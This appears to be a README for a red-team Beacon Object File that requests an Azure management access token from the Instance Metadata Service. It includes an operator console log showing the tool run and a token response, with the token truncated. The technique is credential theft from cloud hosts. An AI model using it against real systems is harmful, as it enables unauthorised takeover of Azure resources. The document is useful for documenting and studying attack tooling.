# Overview
Requests an access token from the Azure Instance Metadata Service (IMDS) for the management resource.


```
[17/12/2024 23:33:27] (finished) operator > exec_bof
[*] Running BOF with name "imds_management_token.x64.o"

[+] Sending request to IMDS endpoint
[+] IMDS Response:
{"access_token":"eyJ0eXA<snip>tmZqw","client_id":"0fda84cf-b157-4e79-b6c8-46b9a4b24c45","expires_in":"86012","expires_on":"1734564422","ext_expires_in":"86399","not_before":"1734477722","resource":"https://management.azure.com/","token_type":"Bearer"}
```